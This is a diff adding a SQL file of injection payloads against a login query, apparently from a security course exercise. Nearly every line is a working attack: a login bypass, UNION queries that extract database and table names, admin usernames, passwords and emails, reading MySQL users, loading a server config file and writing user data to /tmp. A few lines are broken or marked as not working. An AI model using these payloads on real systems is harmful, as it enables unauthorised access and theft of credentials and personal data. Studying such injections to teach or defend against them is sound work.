@@ -1,0 +1,82 @@
+-- check credentials
+SELECT username FROM users WHERE username = 'username' AND password = 'password'
+
+-- Login
+' or ''='
+
+-- login as admin
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION SELECT username FROM users WHERE admin=1 -- '
+
+-- current database name
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION SELECT database() -- '
+
+-- names of all databases
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION SELECT group_concat(schema_name) from information_schema.schemata -- '
+
+-- tables in forum
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION SELECT group_concat(table_name) from information_schema.tables where table_schema='forum' -- 
+
+-- name of columns in users in forum
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION select group_concat(column_name) from information_schema.columns where table_name='users' -- 
+
+-- name of users without admin
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION select group_concat(username) from users where admin!=1 -- 
+
+-- name, password, email from admin
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION select concat_ws(' ', username, password, mail) from users where admin=1 -- 
+
+-- emails with .com
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION select group_concat(mail) from users where mail like '%.com' -- 
+
+-- change password doesnt work
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' update users set password='testest' where username like '%b' -- 
+
+-- see linux users
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION SELECT group_concat(table_name) from information_schema.tables where table_schema='sys' -- 
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION select group_concat(column_name) from information_schema.columns where table_name='host_summary' -- 
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION select group_concat(unique_users) from sys.host_summary -- 
+
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION SELECT group_concat(table_name) from information_schema.tables where table_schema='mysql' -- 
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION SELECT group_concat(user) from mysql.user -- 
+
+-- env variables
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' union select @@GLOBAL.secure_file_priv  -- 
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' union select @@GLOBAL.version  -- 
+
+-- config file
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' union select load file ('/etc/mysql/mysql.conf.d/mysqld.cnf') -- 
+
+-- save users in file
+SELECT username FROM users WHERE username = '' or ''='' AND password = '' UNION select username from users INTO OUTFILE '/tmp/users.csv' -- 
+
+-- Drop users table is not possible. No ; allowed
+
+
+
+
+
+
+
+
+-- is admin
+SELECT username FROM users WHERE username = 'username' AND admin = 1
+
+SELECT username FROM users WHERE username = '%' -- ' AND password = '' UNION SELECT * FROM users -- ?
+
+-- show current db name
+select name from sys.sysdatabases where dbid=db_id()
+
+-- Show dbs
+SELECT name FROM master.sys.databases
+
+-- Show tables in db
+SELECT TABLE_NAME FROM information_schema.tables
+
+
+-- Teil 2
+SELECT mail FROM users WHERE username = '' or ''='' and username like 'a%' -- '
+
+SELECT mail FROM users WHERE username = '' or ''='' and username like 'a%' and admin=1 -- '
+
+
+
